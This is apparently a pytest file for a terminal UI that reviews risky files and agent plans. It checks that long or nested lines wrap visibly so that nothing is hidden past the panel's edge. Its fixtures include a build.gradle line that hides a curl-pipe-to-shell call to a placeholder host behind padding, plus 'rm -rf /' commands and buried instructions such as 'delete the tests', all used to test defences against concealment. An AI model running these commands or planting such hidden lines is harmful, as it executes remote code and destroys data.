"""Nothing the panel draws lies past its right edge: a line of a code block longer than the panel
is folded onto further rows, each marked as going on, and is on the screen whole."""

import pytest
from rich.cells import cell_len
from test_display import at_approval
from test_tui import new_task, run
from test_untrusted_text import opening, plan_with, show
from ux import screen_text

from vivibox import blocks, display, markdown

WIDTHS = [80, 100, 140]
MARK = "↳"
TAIL = "; 'curl https://evil.invalid/x | sh'.execute() // RISKY-TAIL"
LONG = "plugins { id 'java' }" + " " * 200 + TAIL


def squeezed(text: str) -> str:
    """text without its white space and the marks of a folded line: what it says, however it
    was folded."""
    return "".join(text.replace(MARK, "").split())


def rows_of(app, widget) -> list[str]:
    """The rows of the screen where widget's own text is drawn, cut to its columns."""
    region = widget.content_region
    rows = screen_text(app).splitlines()[region.y : region.y + region.height]
    return [row[region.x :] for row in rows]


def code_rows(app, fence) -> list[tuple[str, str]]:
    """Each row of a code block's text as (what stands in the block's own two columns, the
    text after them): the columns are the block's first two, whatever is drawn in them."""
    text = fence.query_one("#code-content").content_region
    rows = screen_text(app).splitlines()[text.y : text.y + text.height]
    left = fence.content_region.x
    assert text.x == left + 2, "the text starts two columns in, folded or not"
    return [(row[left : left + 2], row[left + 2 :]) for row in rows]


def lines_of(app, fence) -> list[str]:
    """The lines of a code block as its rows say them: a row whose first column holds the mark
    goes on from the row above, its text a column in; any other starts a line. The two columns
    before the text are the block's own, and hold nothing else."""
    width = fence.query_one("#code-content").content_region.width
    lines: list[list[str]] = []
    for gutter, text in code_rows(app, fence):
        assert gutter in ("", " ", "  ", MARK, f"{MARK} "), (
            f"only the mark stands before the text: {gutter!r}"
        )
        if gutter.strip():
            assert text[:1] in ("", " "), f"a row that goes on keeps out of the line's first column: {text!r}"
            room = width - (len(lines[-1]) > 1)  # a further row has a cell fewer
            lines[-1][-1] += " " * (room - cell_len(lines[-1][-1]))  # the row above, to its end
            lines[-1].append(text[1:])
        else:
            lines.append([text])
    return ["".join(rows) for rows in lines]


def folded(app, fence) -> int:
    """How many rows of the block go on from the row above."""
    return sum(gutter.strip() == MARK for gutter, _ in code_rows(app, fence))


def risky(task, line: str) -> None:
    from vivibox.risky import Approvals

    (task.repo / "build.gradle").write_text("plugins { id 'java' }\n")
    Approvals(task.meta, task.repo).approve()
    (task.repo / "build.gradle").write_text(line + "\n")
    at_approval(task)


@pytest.mark.parametrize("width", WIDTHS)
def test_a_long_line_of_a_risky_file_is_on_the_screen_whole(env, monkeypatch, width):
    """Where you approve risky files "as shown": a line of build.gradle with 200 spaces after
    its harmless start showed the start alone, with no sign that it went on."""
    task = new_task()
    risky(task, LONG)
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        shown = screen_text(app)
        assert "Risky files changed" in shown and "approve the files as shown" in shown
        (fence,) = app.text.query("MarkdownFence")
        assert squeezed(TAIL) in squeezed("\n".join(rows_of(app, fence))), "the tail is drawn"
        assert f"+{LONG}" in lines_of(app, fence), "and the line reads as the file has it"
        room = fence.size.width - 4
        assert folded(app, fence) == -(-(len(LONG) + 1 - room) // (room - 1)), "a mark on each row"
        assert fence.max_scroll_x == 0, "nothing of it is to the side"
        assert fence.styles.overflow_x == "hidden" and not fence.allow_horizontal_scroll, "and never is"

    run(scenario, size=(width, 60))


def test_vivibox_risky_and_the_panel_show_the_same_line(env, monkeypatch, capsys):
    from vivibox.cli import main

    task = new_task()
    risky(task, LONG)
    capsys.readouterr()
    assert main(["risky", task.id]) == 0
    assert f"+{LONG}" in capsys.readouterr().out.splitlines()


def test_a_line_is_cut_by_the_cells_its_characters_take_as_the_renderer_counts_them():
    def rows(text: str, width: int) -> list[str]:
        cuts = [0, *blocks._cuts(text, width), len(text)]
        return [text[a:b] for a, b in zip(cuts, cuts[1:], strict=False)]

    assert rows("abcdefghij", 4) == ["abcd", "efg", "hij"], (
        "a further row has a cell fewer: it stands a column in"
    )
    assert rows("abcd", 4) == ["abcd"] and rows("", 4) == [""]
    assert rows("x漢漢漢漢", 5) == ["x漢漢", "漢漢"], "a character of two cells goes to the next row whole"
    assert rows("abcde\u0301fgh", 5) == ["abcde\u0301", "fgh"], "a combining mark stays with its letter"
    assert rows("e\u0301" * 9, 4) == ["e\u0301" * 4, "e\u0301" * 3, "e\u0301" * 2], "and takes no cell"
    selected = "☑\ufe0f"
    assert rows(selected * 5, 4) == [selected * 2, selected, selected, selected], (
        "two cells with its selector"
    )
    for text in ("x" * 50, "x漢" * 30, selected * 30 + "tail", "e\u0301" * 40):
        for width in (3, 4, 10, 33):
            cut = rows(text, width)
            assert "".join(cut) == text and all(cell_len(row) <= width - bool(n) for n, row in enumerate(cut))


# A line of each kind that a count of characters gets wrong: two cells a character (after one
# of one cell, so a row ends a cell short), a mark that takes no cell of its own, a tab.
WIDE = "x" + "漢字" * 70 + "WIDE-TAIL"
COMBINING = "é" * 150 + "COMBINING-TAIL"
TABS = "\tx" * 25 + "TABS-TAIL"


@pytest.mark.parametrize("width", WIDTHS)
def test_a_folded_line_counts_wide_and_combining_characters_and_tabs(env, monkeypatch, width):
    task = new_task()
    few = "漢" * 70 + "FEW"  # fewer characters than the block has columns, and more cells
    plan_with(task, display.fenced("\n".join([WIDE, COMBINING, TABS, "short", few]), "text"))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        fence = app.text.query("MarkdownFence").last()
        app.query_one("#detail").scroll_to_widget(fence, animate=False)
        await pilot.pause()
        drawn = squeezed("\n".join(rows_of(app, fence)))
        for tail in ("WIDE-TAIL", "COMBINING-TAIL", "TABS-TAIL"):
            assert tail in drawn, tail
        wide, *others = lines_of(app, fence)
        assert squeezed(wide) == WIDE, "whole; a row may end a cell short of the edge"
        assert others[:3] == [COMBINING, TABS.expandtabs(8), "short"]
        assert [squeezed(line) for line in others[3:]] == [few]
        marked = [text for gutter, text in code_rows(app, fence) if gutter.strip() == MARK]
        assert any("FEW" in text for text in marked), "its last row is marked as going on"
        room = fence.size.width - 4
        assert all(cell_len(text) <= room for _, text in code_rows(app, fence)), "no row is past the edge"
        assert fence.max_scroll_x == 0

    run(scenario, size=(width, 100))


def test_a_line_of_a_code_block_cannot_be_drawn_as_the_rest_of_the_line_above(env, monkeypatch):
    """The mark stands in a column of the block's own, where no text of the block is drawn, and
    the same character in the text is shown as its code point."""
    task = new_task()
    written = f"first\n{MARK} rm -rf / # reads as more of the line above\n  {MARK} after two spaces\nlast"
    plan_with(task, display.fenced(written, "text"))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        fence = app.text.query("MarkdownFence").last()
        app.query_one("#detail").scroll_to_widget(fence, animate=False)
        await pilot.pause()
        assert "‹U+21B3› rm -rf /" in screen_text(app), "the text's own is a code point"
        assert folded(app, fence) == 0, "no row is said to go on"
        assert lines_of(app, fence) == written.replace(MARK, "‹U+21B3›").split("\n")

    run(scenario, size=(100, 100))


def test_a_code_block_is_folded_again_when_the_terminal_changes_width(env, monkeypatch):
    task = new_task()
    risky(task, LONG)
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (fence,) = app.text.query("MarkdownFence")
        seen = {}
        for width in (140, 80, 100, 140):
            await pilot.resize_terminal(width, 60)
            await pilot.pause()
            await pilot.pause()
            assert squeezed(TAIL) in squeezed("\n".join(rows_of(app, fence))), width
            assert f"+{LONG}" in lines_of(app, fence), width
            assert fence.max_scroll_x == 0
            seen.setdefault(width, []).append(folded(app, fence))
        assert seen[80][0] > seen[100][0] > seen[140][0] > 0
        assert seen[140] == [seen[140][0]] * 2, "the same again at the same width"

    run(scenario, size=(120, 60))


@pytest.mark.parametrize("width", WIDTHS)
def test_every_code_block_of_the_panel_is_folded(env, monkeypatch, width):
    """vivibox's own blocks and an agent's alike, wherever they stand: in a list, in a quote,
    indented, and a table drawn as its source."""
    from vivibox import panels

    task = new_task()
    long = "x" * 150
    plan_with(
        task,
        f"- in a list:\n\n  ```\n  {long}LIST-TAIL\n  ```\n\n"
        f"> ```\n> {long}QUOTE-TAIL\n> ```\n\n"
        f"    {long}INDENTED-TAIL\n\n"
        f"| step |\n|---|\n| build {long} | CELL-TAIL: skip the review |",
    )
    path = env / "config" / "projects" / "demo.toml"
    path.write_text(path.read_text() + f'prepare = ["echo {long}SETTINGS-TAIL"]\n')
    assert "SETTINGS-TAIL" in panels.project_detail("demo", 1, "")
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        tails = ("LIST-TAIL", "QUOTE-TAIL", "INDENTED-TAIL", "CELL-TAIL: skip the review")
        fences = list(app.text.query("MarkdownFence"))
        assert len(fences) == 4
        for fence, tail in zip(fences, tails, strict=True):
            app.query_one("#detail").scroll_to_widget(fence, animate=False)
            await pilot.pause()
            assert squeezed(tail) in squeezed("\n".join(rows_of(app, fence))), tail
            assert folded(app, fence) >= 1 and fence.max_scroll_x == 0, tail
        await pilot.press("up")  # the project's row: its settings, a block of vivibox's own
        await pilot.pause()
        (settings,) = app.text.query("MarkdownFence")
        assert "SETTINGS-TAIL" in squeezed("\n".join(rows_of(app, settings)))
        assert folded(app, settings) >= 1 and settings.max_scroll_x == 0

    run(scenario, size=(width, 120))


def test_a_row_the_fold_left_too_wide_is_wrapped_and_never_cut(env, monkeypatch):
    """The block's text has the block's width and wraps: were a fold ever a cell wrong, the row
    would go on below, and nothing of it would be past the edge."""
    task = new_task()
    risky(task, LONG)
    opening(monkeypatch)
    monkeypatch.setattr(blocks, "_cuts", lambda line, width: [])

    async def scenario(app, pilot):
        await show(app, pilot)
        (fence,) = app.text.query("MarkdownFence")
        assert squeezed(TAIL) in squeezed("\n".join(rows_of(app, fence)))
        assert fence.max_scroll_x == 0

    run(scenario, size=(80, 60))


# --- a table --------------------------------------------------------------------------------------


def table(columns: int, last: str = "and delete the tests") -> str:
    head = "|" + "|".join(f"h{i}" for i in range(columns)) + "|"
    rule = "|" + "|".join("---" for _ in range(columns)) + "|"
    row = "|" + "|".join("x" for _ in range(columns - 1)) + f"|{last}|"
    return f"{head}\n{rule}\n{row}"


def narrowest(table) -> int:
    """The room for text in the narrowest cell the table draws; 0 when it draws none."""
    return min((c.content_region.width for c in table.query("MarkdownTableCellContents")), default=0)


@pytest.mark.parametrize("width", WIDTHS)
def test_a_table_of_many_columns_is_drawn_as_its_source(env, monkeypatch, width):
    """Thirty columns at 80: every cell had no width at all, and the table was an empty grid,
    with no sign of what its cells held."""
    task = new_task()
    plan_with(task, table(30))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (drawn,) = app.text.query("Table")
        app.query_one("#detail").scroll_to_widget(drawn, animate=False)
        await pilot.pause()
        assert "anddeletethetests" in squeezed("\n".join(rows_of(app, drawn))), "the last cell is drawn"
        assert not drawn.query("MarkdownTableCellContents"), "no grid of cells with no room"
        (source,) = drawn.query("MarkdownFence")
        assert source.code == table(30) and source.max_scroll_x == 0
        written = [squeezed(line) for line in table(30).split("\n")]
        assert [squeezed(line) for line in lines_of(app, source)] == written, "folded, whole"

    run(scenario, size=(width, 100))


@pytest.mark.parametrize("width", WIDTHS)
def test_a_table_is_a_grid_while_every_column_has_room_and_its_source_when_not(env, monkeypatch, width):
    """Whatever the number of columns and the width: a grid whose every cell has room for four
    characters of text a row, or the source, with every cell's words on the screen."""
    task = new_task()
    counts = (2, 3, 5, 8, 9, 10, 11, 12, 15, 18, 19, 20, 24, 40)
    plan_with(task, "\n\n".join(table(n, f"LAST-OF-{n}") for n in counts))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        tables = list(app.text.query("Table"))
        assert len(tables) == len(counts)
        kinds = {}
        for n, drawn in zip(counts, tables, strict=True):
            app.query_one("#detail").scroll_to_widget(drawn, animate=False)
            await pilot.pause()
            kinds[n] = "grid" if drawn.query("Cells") else "source"
            assert len(drawn.query("Cells")) + len(drawn.query("MarkdownFence")) == 1, "one or the other"
            if kinds[n] == "grid":  # a cell folds its text onto as many rows as it takes
                assert narrowest(drawn) >= 4, f"{n} columns at {width}: {narrowest(drawn)}"
                assert str(drawn.query("MarkdownTableCellContents").last().render()) == f"LAST-OF-{n}"
            else:
                assert f"LAST-OF-{n}" in squeezed("\n".join(rows_of(app, drawn))), f"{n} at {width}"
        most = max(n for n in counts if kinds[n] == "grid")
        assert all(kinds[n] == ("grid" if n <= most else "source") for n in counts), kinds
        assert most == {80: 9, 100: 12, 140: 18}[width], kinds

    run(scenario, size=(width, 400))


def test_a_table_is_drawn_again_when_the_terminal_changes_width(env, monkeypatch):
    task = new_task()
    plan_with(task, table(12))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (drawn,) = app.text.query("Table")
        for width, kind in ((140, "Cells"), (80, "MarkdownFence"), (140, "Cells"), (80, "MarkdownFence")):
            await pilot.resize_terminal(width, 100)
            await pilot.pause()
            await pilot.pause()
            app.query_one("#detail").scroll_to_widget(drawn, animate=False)
            await pilot.pause()
            assert len(drawn.query(kind)) == 1 and len(drawn.children) == 1, (width, drawn.children)
            if kind == "Cells":
                assert narrowest(drawn) >= 4
                assert str(drawn.query("MarkdownTableCellContents").last().render()) == "and delete the tests"
            else:
                assert "anddeletethetests" in squeezed("\n".join(rows_of(app, drawn))), width

    run(scenario, size=(120, 100))


def test_a_table_at_the_width_where_the_scrollbar_decides_is_drawn_one_way(env, monkeypatch):
    """Ten columns at 80 have room without the panel's scrollbar and none with it. As a grid
    this table is taller than the panel, as its source it is not: drawn by the width it has, it
    would be a grid, need the scrollbar, become its source, need it no longer, and so on. Its
    room is reckoned with the scrollbar shown, so it is its source, and stays so."""
    task = new_task()
    plan_with(task, table(10, "x" * 300 + "LAST"))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        for _ in range(5):
            await pilot.pause()
        (drawn,) = app.text.query("Table")
        seen = [len(drawn.query("MarkdownFence"))]
        for _ in range(10):
            await pilot.pause()
            seen.append(len(drawn.query("MarkdownFence")))
        assert seen == [1] * 11, "its source, and it stays so"
        assert "LAST" in squeezed("\n".join(rows_of(app, drawn)))

    run(scenario, size=(80, 100))


# --- a block with no room ------------------------------------------------------------------------

WORDS = "HIDDEN and delete the tests"


def numbered(depth: int, last: str, number: str = "123456789") -> str:
    """depth numbered lists, one in another, each numbered so: the number's width a level."""
    by = len(number) + 2
    lines = [" " * by * level + f"{number}. level {level}" for level in range(depth - 1)]
    inner = " " * by * (depth - 1)
    lines.append(f"{inner}{number}. " + last.replace("\n", "\n" + inner + " " * by))
    return "\n\n".join(lines) + "\n\nAFTER-THE-LISTS"


def bulleted(depth: int, last: str) -> str:
    lines = ["  " * level + f"- level {level}" for level in range(depth - 1)]
    inner = "  " * (depth - 1)
    lines.append(f"{inner}- " + last.replace("\n", "\n" + inner + "  "))
    return "\n\n".join(lines) + "\n\nAFTER-THE-LISTS"


def quoted_in(depth: int, last: str) -> str:
    return "\n".join("> " * depth + line for line in last.split("\n")) + "\n\nAFTER-THE-LISTS"


def mixed(depth: int, last: str) -> str:
    """A numbered list in a quote in a numbered list, and so on."""
    prefix, lines = "", []
    for level in range(depth):
        lines += [f"{prefix}{level + 10}. level {level}", prefix.rstrip()]
        prefix += "    > "
    lines += [prefix + line for line in last.split("\n")]
    return "\n".join(lines) + "\n\nAFTER-THE-LISTS"


@pytest.mark.parametrize("width,depth", [(80, 6), (100, 8), (80, 5), (140, 9)])
@pytest.mark.parametrize("last", [WORDS, f"see:\n\n```\n{WORDS}\n```"], ids=["words", "code"])
def test_what_stands_in_numbered_lists_is_on_the_screen(env, monkeypatch, width, depth, last):
    """Six numbered lists one in another, each numbered 123456789, take twelve columns a level:
    the paragraph or the code block in the last was drawn nowhere, at any place of the scroll."""
    from test_agent_prose import every_row, said

    task = new_task()
    plan_with(task, numbered(depth, last))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        drawn = said(await every_row(app, pilot))
        assert "AFTER-THE-LISTS" in drawn
        assert "HIDDENanddeletethetests" in drawn, "the writer reads it; the panel draws none of it"

    run(scenario, size=(width, 40))


def numbered_short(depth: int, last: str) -> str:
    """Lists numbered 12345: eight columns a level, so the ten columns a block needs fall
    between two depths (fourteen left at seven, six at eight)."""
    return numbered(depth, last, "12345")


def two_items(depth: int, last: str) -> str:
    """Lists of two items that begin at 999999999: the second is drawn 1000000000, a digit more,
    and the list takes its columns by that one."""
    by = 11
    lines = [" " * by * level + f"999999999. level {level}" for level in range(depth - 1)]
    inner = " " * by * (depth - 1)
    lines.append(f"{inner}999999999. " + last.replace("\n", "\n" + inner + " " * by))
    lines += [" " * by * level + f"1. the second of {level}" for level in reversed(range(depth))]
    return "\n\n".join(lines) + "\n\nAFTER-THE-LISTS"


SHAPES = {"numbered": numbered, "bulleted": bulleted, "quoted": quoted_in, "mixed": mixed,
          "numbered 12345": numbered_short, "two items": two_items}  # fmt: skip
# The deepest of each that is drawn as markdown: one level more, and a block of it would have
# fewer than ten columns in a terminal of 80.
DEEPEST = {"numbered": 5, "bulleted": 9, "quoted": 19, "mixed": 6, "numbered 12345": 7, "two items": 4}
LASTS = {"words": WORDS, "code": f"see:\n\n```\n{WORDS}\n```", "table": "| a | b |\n|---|---|\n| c | d |"}


@pytest.mark.parametrize("shape", SHAPES)
@pytest.mark.parametrize("last", LASTS)
def test_a_piece_with_a_block_that_has_no_room_at_80_columns_is_its_source(shape, last):
    """Decided on what the parser found, for a terminal of 80 columns, whatever the width is: a
    piece is markdown while every block of it has ten columns there, and its source from the
    first block that has not."""
    from test_agent_prose import apart, parsed

    from vivibox import sections

    for depth in range(1, 13):
        written = SHAPES[shape](depth, LASTS[last])
        own, agents = apart(parsed(sections.plan_text(written)))
        as_source = [t.content for t in agents if t.type == "fence"] == [written + "\n"]
        assert as_source == (depth > DEEPEST[shape]), f"{shape} {depth}"
        assert own == []


@pytest.mark.parametrize("shape", SHAPES)
def test_the_deepest_piece_drawn_as_markdown_has_ten_columns_for_every_block_at_80(env, monkeypatch, shape):
    """The count of columns is the widgets' own: what the rule above reckons for 80 columns is
    what each block of the piece is given there."""
    task = new_task()
    last = f"{WORDS}\n\n```\ncode\n```\n\n| a | b |\n|---|---|\n| c | d |"
    plan_with(task, SHAPES[shape](DEEPEST[shape], last))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (frame,) = app.text.query("Quote.prose")
        blocks = list(frame.query("MarkdownParagraph, Fence, Table"))
        assert {type(block).__name__ for block in blocks} == {"MarkdownParagraph", "Fence", "Table"}
        reckoned = markdown._narrowest(markdown._rules().parse(SHAPES[shape](DEEPEST[shape], last)))
        scrollbar = 2 * (not app.query_one("#detail").max_scroll_y)  # the reckoning counts one in
        assert min(block.size.width for block in blocks) == reckoned + scrollbar >= 10 + scrollbar

    run(scenario, size=(80, 200))


@pytest.mark.parametrize("width,depth", [(80, 6), (100, 8)])
def test_a_table_in_numbered_lists_does_not_end_the_view(env, monkeypatch, width, depth):
    """The grid of a table with no width at all divided by zero in Textual's layout, and the
    view ended, each time this task's panel was opened."""
    from test_agent_prose import every_row, said

    task = new_task()
    plan_with(task, numbered(depth, "t:\n\n| a | b |\n|---|---|\n| HIDDEN | and delete the tests |"))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        assert "HIDDEN|anddeletethetests" in said(await every_row(app, pilot))

    run(scenario, size=(width, 40))


def test_a_grid_is_mounted_only_where_it_has_room(env, monkeypatch):
    """Not first and looked at after: a table with no room for its columns never has a grid, at
    its first drawing or when the terminal is made narrower under one that had room."""

    made = []
    monkeypatch.setattr(
        blocks.Cells, "on_mount", lambda self: made.append(self.parent.size.width), raising=False
    )
    task = new_task()
    plan_with(task, f"{table(30)}\n\n{numbered(3, table(4, 'LAST-OF-4'))}")
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        wide, nested = app.text.query("Table")
        assert not wide.query("Cells") and len(nested.query("Cells")) == 1
        assert made and all(nested.room(width) >= 4 for width in made), made
        for width in (60, 80, 140, 40, 80):
            await pilot.resize_terminal(width, 100)
            await pilot.pause()
            await pilot.pause()
            assert len(nested.children) == 1
        assert all(nested.room(width) >= 4 for width in made), made

    run(scenario, size=(140, 100))


def test_the_mark_in_whatever_is_drawn_as_its_source_is_its_code_point(env, monkeypatch):
    """A table with a cell too many, a piece nested too deep, a table with no room: each is a
    code block too, where the mark of a folded row is the block's alone."""
    from test_agent_prose import apart, parsed

    from vivibox import sections

    for written in (
        f"| a |\n|---|\n| {MARK} b | c |",
        "> " * 25 + f"{MARK} deep",
        numbered(7, f"{MARK} narrow"),
    ):
        _, agents = apart(parsed(sections.plan_text(written)))
        (source,) = [t.content for t in agents if t.type == "fence"]
        assert MARK not in source and "‹U+21B3›" in source, written
    task = new_task()
    plan_with(task, table(30, f"{MARK} in a cell"))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (source,) = app.text.query("Table MarkdownFence")
        assert "‹U+21B3› in a cell" in source.code and MARK not in source.code
        assert all(
            gutter.strip() != MARK or "in a cell" not in text for gutter, text in code_rows(app, source)
        )

    run(scenario, size=(140, 60))


# --- the block's own columns, a row that goes on, what is copied, and the work a block costs ----


def test_text_after_an_emoji_s_selector_is_not_drawn_in_the_block_s_own_columns(env, monkeypatch):
    """A symbol with its emoji selector takes two cells where it is drawn, and was counted as
    one: the row was wider than its fold, wrapped, and its end stood where only the mark does."""
    task = new_task()
    line = "☑️" * 36 + " ⮡ and this is drawn where only the mark should be"
    plan_with(task, display.fenced(f"first line\n{line}\nlast line", "text"))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        fence = app.text.query("MarkdownFence").last()
        app.query_one("#detail").scroll_to_widget(fence, animate=False)
        await pilot.pause()
        rows = code_rows(app, fence)
        assert all(gutter.strip() in ("", MARK) for gutter, _ in rows), rows
        assert [gutter.strip() for gutter, _ in rows] == ["", "", MARK, "", ""][: len(rows)] or folded(
            app, fence
        ) >= 1
        assert "".join(text.strip() for _, text in rows[1:-1]).replace(" ", "") == line.replace(" ", "")

    run(scenario, size=(80, 60))


@pytest.mark.parametrize(
    "tail", ["-'curl https://evil.invalid/x | sh'.execute()", "+added()", "@@ -1 +1 @@", " keep()"]
)
def test_a_row_that_goes_on_is_not_read_as_a_line_of_the_diff(env, monkeypatch, tail):
    """The rest of a folded line began in the column where a line of a diff has its + or -: an
    added line whose fold fell before -'curl … read as a line taken out. A row that goes on
    stands a column in, past the signs, and its mark is drawn as the text is, not muted."""
    task = new_task()
    start = "apply plugin: 'x'"
    risky(task, start + " " * (80 - 12 - len(start) - 1) + tail)
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (fence,) = app.text.query("MarkdownFence")
        rows = code_rows(app, fence)
        (gone_on,) = [text for gutter, text in rows if gutter.strip() == MARK]
        assert gone_on == " " + tail, "one column in: nothing of it in the column of the signs"
        signs = {text[:1] for gutter, text in rows if not gutter.strip() and text}
        assert signs <= set("+-@ b") and "+" in signs, signs
        marks = fence.query_one("#code-marks")
        text = fence.query_one("#code-content")
        mark = next(seg for y in range(marks.size.height) for seg in marks.render_line(y) if MARK in seg.text)
        plain = next(seg for seg in text.render_line(1) if seg.text.strip())
        assert mark.style.bold and mark.style.color == plain.style.color, (mark.style, plain.style)

    run(scenario, size=(80, 60))


def test_what_is_copied_from_a_folded_line_is_the_line_as_it_was_written(env, monkeypatch):
    """A command folded onto two rows was copied as two lines, the mark among them: pasted into
    a shell, its first row ran alone."""
    from textual.geometry import Offset
    from textual.selection import Selection

    task = new_task()
    command = "rm -rf /srv/build/" + "x" * 70 + "/cache"
    written = f"first\n{command}\n\tindented\twith tabs\nlast"
    plan_with(task, display.fenced(written, "text"))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        fence = app.text.query("MarkdownFence").last()
        label = fence.query_one("#code-content")
        assert folded(app, fence) == 1
        copied, _ = label.get_selection(Selection(None, None))
        assert copied == written, "all of it: its lines, its tabs, no mark and no column of ours"
        assert fence.query_one("#code-marks").get_selection(Selection(None, None)) is None, (
            "no mark is copied"
        )
        width = label.content_region.width
        rows = [  # (row, column) as drawn → what stands there in what was written
            (Offset(0, 1), Offset(5, 2), command),  # the line's two rows, to four characters in
            (Offset(7, 1), Offset(width, 1), command[7:width]),  # to the end of the first row
            (Offset(3, 2), Offset(9, 2), command[width + 2 : width + 8]),  # within the second row
            (Offset(0, 2), Offset(1, 2), ""),  # the column a further row stands in is none of the line's
            (Offset(0, 3), Offset(9, 3), "\tindented"[:2]),  # a tab is one character, eight columns
        ]
        (start, end, expected) = rows[0]
        assert label.get_selection(Selection(start, end))[0] == command[: width + 4]
        for start, end, expected in rows[1:]:
            assert label.get_selection(Selection(start, end))[0] == expected, (start, end)

    run(scenario, size=(80, 60))


def test_a_block_costs_the_work_of_its_long_lines_alone_and_once(env, monkeypatch):
    """Twenty thousand lines of a risky file were each cut and put together again, whether they
    fitted or not, at every change of width and every time anything else in the panel changed."""
    import textual.highlight

    cut, read = [], []
    cuts, highlight = blocks._cuts, textual.highlight.highlight
    monkeypatch.setattr(
        blocks, "_cuts", lambda line, width: cut.append((len(line), width)) or cuts(line, width)
    )
    monkeypatch.setattr(
        blocks, "highlight", lambda code, **how: read.append(len(code)) or highlight(code, **how)
    )
    task = new_task()
    lines = ["x = 1"] * 3000
    lines[10], lines[2000] = "a" * 300, "b" * 500
    risky(task, "\n".join(lines))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (fence,) = app.text.query("MarkdownFence")
        widths = {width for _, width in cut}
        assert sorted(cut) == sorted((n, width) for n in (301, 501) for width in widths), "the two long lines"
        assert len(read) == 1 and len(widths) <= 2, (
            "read once; cut for the width with the scrollbar and without"
        )
        assert "".join(fence.query_one("#code-marks").rows).count(MARK) > 6
        await pilot.resize_terminal(140, 60)
        await pilot.pause()
        assert len(cut) == len(set(cut)) and {n for n, _ in cut} == {301, 501}, "those two, once a width"
        assert len(read) == 1
        await pilot.resize_terminal(140, 50)
        await pilot.pause()
        await pilot.pause()
        done = len(cut)  # whatever widths the layout went through on its way: none of them twice
        assert done == len(set(cut))
        app.shown = ""  # as when anything else in the panel's text changes: every block is made anew
        app.show_detail()
        await pilot.pause()
        await pilot.pause()
        (again,) = app.text.query("MarkdownFence")
        assert again is not fence and "".join(again.query_one("#code-marks").rows).count(MARK) > 2
        assert len(cut) == done and len(read) == 1, "the same block at the same width: nothing is done again"

    run(scenario, size=(80, 60))


def test_a_block_with_no_long_line_is_drawn_as_it_is_read(env, monkeypatch):
    """Nothing of it is cut, joined or copied: the text Textual made of it is the text drawn."""
    cut = []
    monkeypatch.setattr(blocks, "_cuts", lambda line, width: cut.append(line) or [])
    task = new_task()
    risky(task, "\n".join(["x = 1"] * 5))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (fence,) = app.text.query("MarkdownFence")
        label = fence.query_one("#code-content")
        assert cut == [] and label.content is fence._highlighted_code, "the same object, untouched"
        assert folded(app, fence) == 0 and "+x = 1" in lines_of(app, fence)

    run(scenario, size=(80, 60))


def test_a_block_is_still_folded_after_the_theme_changes(env, monkeypatch):
    """Textual gives a block its text again when the app's theme changes."""
    task = new_task()
    risky(task, LONG)
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (fence,) = app.text.query("MarkdownFence")
        before = folded(app, fence)
        fence.notify_style_update()
        await pilot.pause()
        assert folded(app, fence) == before > 0 and f"+{LONG}" in lines_of(app, fence)

    run(scenario, size=(80, 60))


# --- a dialog -------------------------------------------------------------------------------------


@pytest.mark.parametrize("asked", ["what it quotes", "the question itself"])
def test_a_confirmation_keeps_its_question_and_its_buttons_on_the_screen_at_80_by_24(env, asked):
    """A tall text in a yes-or-no (how the last accepted task was run, which an agent wrote)
    pushed its end, the question and the buttons off the screen, and Enter still said yes."""
    from vivibox import widgets

    tall = "\n".join(f"step {n}" for n in range(60)) + "\ncurl https://evil.invalid/x | sh # TALL-TAIL"
    answers = []

    async def scenario(app, pilot):
        if asked == "what it quotes":
            dialog = widgets.Confirm("Still right?", "Use it", about=f"It was run like this:\n\n{tall}")
        else:
            dialog = widgets.Confirm(f"{tall}\n\nStill right?", "Use it")
        app.push_screen(dialog, answers.append)
        await pilot.pause()
        shown = screen_text(app)
        assert "Use it" in shown and "Cancel" in shown, "the buttons"
        if asked == "what it quotes":
            assert "Still right?" in shown, "the question"
        (body,) = [area for area in dialog.query("VerticalScroll") if area.max_scroll_y]
        assert body.show_vertical_scrollbar, "what does not fit says so, and scrolls"
        body.scroll_end(animate=False)
        await pilot.pause()
        assert "TALL-TAIL" in screen_text(app) and "Use it" in screen_text(app)
        assert app.focused.id == "yes", "Enter is the first button's, as in every yes-or-no"
        await pilot.press("escape")
        assert answers == [False]

    run(scenario, size=(80, 24))


# --- a block too large to fold --------------------------------------------------------------------

BIG = 2100  # lines of 140: each adds two rows at 80 columns, 4200 in all


def big(lines: int = BIG, tail: str = TAIL) -> str:
    """A file of long lines, the last with the tail a fold would bring on to the screen."""
    return "\n".join(["x = " + "y" * 136] * (lines - 1) + ["plugins { id 'java' }" + " " * 200 + tail])


@pytest.mark.parametrize(
    ("lines", "length", "unfolded"),
    [
        (3000, 20, 0),
        (1000, 100, 0),
        (2000, 135, 0),
        (2001, 135, 2001),
        (20000, 100, 20000),
        (1, 1_000_000, 1),
    ],
)
def test_a_block_is_folded_until_folding_adds_more_than_two_thousand_rows(lines, length, unfolded):
    """Reckoned for the width a block's text has in a terminal of 80 columns, whatever the
    width is: an ordinary file is folded (three thousand lines with twenty long ones, a
    lockfile of a thousand), and what is left unfolded is so at every width."""
    code = "\n".join(
